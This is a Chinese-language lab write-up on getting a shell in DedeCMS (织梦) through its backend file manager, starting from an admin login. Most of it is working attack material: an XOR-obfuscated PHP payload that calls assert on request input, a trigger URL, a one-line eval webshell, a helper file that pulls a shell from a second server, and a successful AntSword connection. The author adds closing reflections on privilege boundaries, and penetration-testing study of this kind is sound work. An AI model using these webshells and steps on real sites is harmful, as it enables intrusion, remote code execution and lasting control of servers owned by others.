ailx10说：这篇是2024年8月之前写的，后来又改过。织梦这篇从后台文件管理器开始。我已经有管理员身份，先新建 PHP，再用字符串异或得到所需名字、调用 phpinfo，后面继续试写文件和连接。写的时候觉得那段字符变换挺有意思，回头看却更清楚，关键权能其实是后台已经能创建可执行文件。笔记保留了当时的具体写法，也想给这些能力排好顺序：哪些是管理员本来就掌握的功能，哪些才是额外风险，分清之后，所谓绕过才不至于只是把已有权限换了一种表达。

---

（1）登录后台

![](/notes-assets/49d6606f8a4c0738a167.webp)

（2）在“附件管理” -\> “文件式管理器” -\> “新建文件”，输入POC载荷

```
<?
$_iCE="f"^"\x39";
$_kVv="H"^"\xf";
$_UIM="F"^"\x3";
$_kKH="l"^"\x38";

$get=$_iCE.$_kVv.$_UIM.$_kKH;
${$get}['func'](${$get}['shell']);
```

![](/notes-assets/281319b59c34f447dbc7.webp)

（3）前台访问，触发远程代码执行

```
http://192.168.220.190/uploads/1.php?func=assert&shell=phpinfo();
```

![](/notes-assets/ed07bd9c410aa5bbbf49.webp)

（4）准备一句话木马

```
<?php @eval($_POST['x']); ?>
```

（5）后台新建`2.php` ，注意`mazi.php`远程代码是放在另一台服务器`192.168.220.1`

![](/notes-assets/59bd4244b68f21303337.webp)

（6）前台访问`2.php`

![](/notes-assets/22c179d132533295b556.webp)

（7）后台观察，生成了`mazi.php`

![](/notes-assets/bcd063f042cd0e463438.webp)

（8）蚁剑连接，getshell 成功

```
 http://192.168.220.190/uploads/mazi.php
```

![](/notes-assets/83576d49061b62819663.webp)

![](/notes-assets/d7288220f2bf2ac3765e.webp)

最值得回头问的，是站点原本允许谁创建可执行文件。技巧可以变化，权限边界却不能省略；不交代起点，后面的结果看着再惊人，也容易让读者误会利用门槛。
